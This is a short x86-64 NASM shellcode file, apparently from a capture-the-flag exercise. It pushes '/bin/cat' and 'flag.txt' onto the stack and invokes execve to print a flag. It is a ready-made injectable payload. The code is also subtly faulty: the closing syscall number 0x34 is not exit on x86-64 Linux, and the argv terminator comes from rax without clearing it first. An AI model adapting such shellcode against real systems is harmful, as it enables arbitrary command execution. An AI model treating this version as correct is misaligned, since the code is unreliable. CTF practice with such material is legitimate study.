; execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
BITS 64
    section .text
            global _start

    _start:
            xor rdx, rdx
            push rdx
            mov qword rbx, 'flag.txt'
            push rbx
            mov r13, rsp
            push rdx
            mov qword rbx, '/bin/cat'
            push rbx
            mov rdi, rsp
            push rax
            push r13
            ; sycall execve, rdx is initially zero
            push rdi
            mov rsi, rsp
            mov al, 0x3b
            syscall

            xor rdi, rdi
            mov al, 0x34
            syscall
